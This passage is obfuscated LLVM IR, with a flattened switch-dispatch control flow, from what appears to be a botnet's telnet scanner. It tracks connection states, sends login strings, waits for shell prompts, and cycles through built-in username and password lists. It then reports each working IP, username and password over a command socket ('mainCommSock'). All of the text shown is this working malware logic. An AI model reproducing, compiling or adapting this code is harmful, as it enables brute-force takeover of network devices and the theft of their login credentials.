  %717 = load i32, i32* %2, align 4
  %718 = sext i32 %717 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 0
  %721 = load i32, i32* %720, align 16
  %722 = call i32 @sclose(i32 %721)
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 2
  store i8 0, i8* %726, align 8
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 3
  store i8 1, i8* %730, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = call i64 @send(i32 %736, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %738 = icmp slt i64 %737, 0
  %739 = select i1 %738, i32 -471126769, i32 -1404599168
  store i32 %739, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 0
  %745 = load i32, i32* %744, align 16
  %746 = call i32 @sclose(i32 %745)
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 2
  store i8 0, i8* %750, align 8
  %751 = load i32, i32* %2, align 4
  %752 = sext i32 %751 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 3
  store i8 1, i8* %754, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:755:                                    ; preds = %loopEntry
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 2
  store i8 6, i8* %759, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:760:                                    ; preds = %loopEntry
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 6
  %765 = load i32, i32* %764, align 4
  %766 = icmp eq i32 %765, 0
  %767 = select i1 %766, i32 -284853988, i32 -989834339
  store i32 %767, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %770 = load i32, i32* %2, align 4
  %771 = sext i32 %770 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 6
  store i32 %769, i32* %773, align 4
  store i32 -989834339, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = load i32, i32* %2, align 4
  %776 = sext i32 %775 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 0
  %779 = load i32, i32* %778, align 16
  %780 = load i32, i32* %2, align 4
  %781 = sext i32 %780 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 8
  %784 = load i8*, i8** %783, align 8
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 7
  %789 = load i16, i16* %788, align 16
  %790 = zext i16 %789 to i32
  %791 = call i32 @readUntil(i32 %779, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %784, i32 1024, i32 %790)
  %792 = icmp ne i32 %791, 0
  %793 = select i1 %792, i32 2105923458, i32 -822111731
  store i32 %793, i32* %switchVar
  br label %loopEnd

; <label>:794:                                    ; preds = %loopEntry
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 6
  store i32 0, i32* %798, align 4
  %799 = load i32, i32* %2, align 4
  %800 = sext i32 %799 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 7
  store i16 0, i16* %802, align 16
  %803 = load i32, i32* %2, align 4
  %804 = sext i32 %803 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 8
  %807 = load i8*, i8** %806, align 8
  %808 = call i8* @strstr(i8* %807, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %809 = icmp ne i8* %808, null
  %810 = select i1 %809, i32 -1290239001, i32 -654118699
  store i32 %810, i32* %switchVar
  br label %loopEnd

; <label>:811:                                    ; preds = %loopEntry
  %812 = load i32, i32* %2, align 4
  %813 = sext i32 %812 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 8
  %816 = load i8*, i8** %815, align 8
  call void @llvm.memset.p0i8.i64(i8* %816, i8 0, i64 1024, i32 1, i1 false)
  %817 = load i32, i32* %2, align 4
  %818 = sext i32 %817 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 0
  %821 = load i32, i32* %820, align 16
  %822 = call i32 @sclose(i32 %821)
  %823 = load i32, i32* %2, align 4
  %824 = sext i32 %823 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 2
  store i8 0, i8* %826, align 8
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 3
  store i8 0, i8* %830, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:831:                                    ; preds = %loopEntry
  %832 = load i32, i32* %2, align 4
  %833 = sext i32 %832 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 8
  %836 = load i8*, i8** %835, align 8
  %837 = call i32 @matchPrompt(i8* %836)
  %838 = icmp ne i32 %837, 0
  %839 = select i1 %838, i32 1713805429, i32 770647067
  store i32 %839, i32* %switchVar
  br label %loopEnd

; <label>:840:                                    ; preds = %loopEntry
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 8
  %845 = load i8*, i8** %844, align 8
  call void @llvm.memset.p0i8.i64(i8* %845, i8 0, i64 1024, i32 1, i1 false)
  %846 = load i32, i32* %2, align 4
  %847 = sext i32 %846 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 0
  %850 = load i32, i32* %849, align 16
  %851 = call i32 @sclose(i32 %850)
  %852 = load i32, i32* %2, align 4
  %853 = sext i32 %852 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %853
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %854, i32 0, i32 2
  store i8 0, i8* %855, align 8
  %856 = load i32, i32* %2, align 4
  %857 = sext i32 %856 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 3
  store i8 1, i8* %859, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:860:                                    ; preds = %loopEntry
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 2
  store i8 7, i8* %864, align 8
  store i32 488341100, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 8
  %870 = load i8*, i8** %869, align 8
  call void @llvm.memset.p0i8.i64(i8* %870, i8 0, i64 1024, i32 1, i1 false)
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:871:                                    ; preds = %loopEntry
  %872 = load i32, i32* %2, align 4
  %873 = sext i32 %872 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %873
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %874, i32 0, i32 8
  %876 = load i8*, i8** %875, align 8
  %877 = call i64 @strlen(i8* %876) #10
  %878 = trunc i64 %877 to i16
  %879 = load i32, i32* %2, align 4
  %880 = sext i32 %879 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 7
  store i16 %878, i16* %882, align 16
  store i32 -307829368, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 6
  %888 = load i32, i32* %887, align 4
  %889 = add i32 %888, 30
  %890 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %891 = icmp ult i32 %889, %890
  %892 = select i1 %891, i32 2066548260, i32 -462463601
  store i32 %892, i32* %switchVar
  br label %loopEnd

; <label>:893:                                    ; preds = %loopEntry
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 0
  %898 = load i32, i32* %897, align 16
  %899 = call i32 @sclose(i32 %898)
  %900 = load i32, i32* %2, align 4
  %901 = sext i32 %900 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 2
  store i8 0, i8* %903, align 8
  %904 = load i32, i32* %2, align 4
  %905 = sext i32 %904 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %905
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %906, i32 0, i32 3
  store i8 1, i8* %907, align 1
  store i32 -462463601, i32* %switchVar
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:909:                                    ; preds = %loopEntry
  %910 = load i32, i32* %2, align 4
  %911 = sext i32 %910 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 0
  %914 = load i32, i32* %913, align 16
  %915 = call i64 @send(i32 %914, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i64 4, i32 16384)
  %916 = icmp slt i64 %915, 0
  %917 = select i1 %916, i32 -944616366, i32 1313619163
  store i32 %917, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i32, i32* %2, align 4
  %920 = sext i32 %919 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 0
  %923 = load i32, i32* %922, align 16
  %924 = call i32 @sclose(i32 %923)
  %925 = load i32, i32* %2, align 4
  %926 = sext i32 %925 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 2
  store i8 0, i8* %928, align 8
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 3
  store i8 1, i8* %932, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:933:                                    ; preds = %loopEntry
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 2
  store i8 8, i8* %937, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:938:                                    ; preds = %loopEntry
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 0
  %943 = load i32, i32* %942, align 16
  %944 = call i64 @send(i32 %943, i8* getelementptr inbounds ([266 x i8], [266 x i8]* @.str.31, i32 0, i32 0), i64 85, i32 16384)
  %945 = icmp slt i64 %944, 0
  %946 = select i1 %945, i32 -655162305, i32 103448421
  store i32 %946, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 0
  %952 = load i32, i32* %951, align 16
  %953 = call i32 @sclose(i32 %952)
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 2
  store i8 0, i8* %957, align 8
  %958 = load i32, i32* %2, align 4
  %959 = sext i32 %958 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 3
  store i8 1, i8* %961, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 2
  store i8 9, i8* %966, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:967:                                    ; preds = %loopEntry
  %968 = load i32, i32* %2, align 4
  %969 = sext i32 %968 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %969
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %970, i32 0, i32 0
  %972 = load i32, i32* %971, align 16
  %973 = call i64 @send(i32 %972, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.32, i32 0, i32 0), i64 49, i32 16384)
  %974 = icmp slt i64 %973, 0
  %975 = select i1 %974, i32 73533734, i32 1641753519
  store i32 %975, i32* %switchVar
  br label %loopEnd

; <label>:976:                                    ; preds = %loopEntry
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 16
  %982 = call i32 @sclose(i32 %981)
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 2
  store i8 0, i8* %986, align 8
  %987 = load i32, i32* %2, align 4
  %988 = sext i32 %987 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %988
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %989, i32 0, i32 3
  store i8 1, i8* %990, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 2
  store i8 10, i8* %995, align 8
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 6
  %1001 = load i32, i32* %1000, align 4
  %1002 = icmp eq i32 %1001, 0
  %1003 = select i1 %1002, i32 -382660168, i32 -1603156585
  store i32 %1003, i32* %switchVar
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1006 = load i32, i32* %2, align 4
  %1007 = sext i32 %1006 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %1007
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1008, i32 0, i32 6
  store i32 %1005, i32* %1009, align 4
  store i32 -1603156585, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  %1011 = load i32, i32* %2, align 4
  %1012 = sext i32 %1011 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 16
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 8
  %1020 = load i8*, i8** %1019, align 8
  %1021 = load i32, i32* %2, align 4
  %1022 = sext i32 %1021 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 7
  %1025 = load i16, i16* %1024, align 16
  %1026 = zext i16 %1025 to i32
  %1027 = call i32 @readUntil(i32 %1015, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1020, i32 1024, i32 %1026)
  %1028 = icmp ne i32 %1027, 0
  %1029 = select i1 %1028, i32 1074623970, i32 2118132470
  store i32 %1029, i32* %switchVar
  br label %loopEnd

; <label>:1030:                                   ; preds = %loopEntry
  %1031 = load i32, i32* %2, align 4
  %1032 = sext i32 %1031 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 6
  store i32 0, i32* %1034, align 4
  %1035 = load i32, i32* %2, align 4
  %1036 = sext i32 %1035 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 7
  store i16 0, i16* %1038, align 16
  %1039 = load i32, i32* %2, align 4
  %1040 = sext i32 %1039 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %1040
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1041, i32 0, i32 8
  %1043 = load i8*, i8** %1042, align 8
  %1044 = call i8* @strstr(i8* %1043, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.34, i32 0, i32 0)) #10
  %1045 = icmp ne i8* %1044, null
  %1046 = select i1 %1045, i32 32530667, i32 -241222591
  store i32 %1046, i32* %switchVar
  br label %loopEnd

; <label>:1047:                                   ; preds = %loopEntry
  %1048 = load i32, i32* @mainCommSock, align 4
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 1
  %1053 = bitcast i32* %1052 to %struct.in_addr*
  %1054 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 4
  %1056 = call i8* @inet_ntoa(i32 %1055) #4
  %1057 = load i32, i32* %2, align 4
  %1058 = sext i32 %1057 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 4
  %1061 = load i8, i8* %1060, align 2
  %1062 = zext i8 %1061 to i64
  %1063 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %1062
  %1064 = load i8*, i8** %1063, align 8
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 5
  %1069 = load i8, i8* %1068, align 1
  %1070 = zext i8 %1069 to i64
  %1071 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1070
  %1072 = load i8*, i8** %1071, align 8
  %1073 = call i32 (i32, i8*, ...) @sockprintf(i32 %1048, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.35, i32 0, i32 0), i8* %1056, i8* %1064, i8* %1072)
  store i32 -241222591, i32* %switchVar
  br label %loopEnd

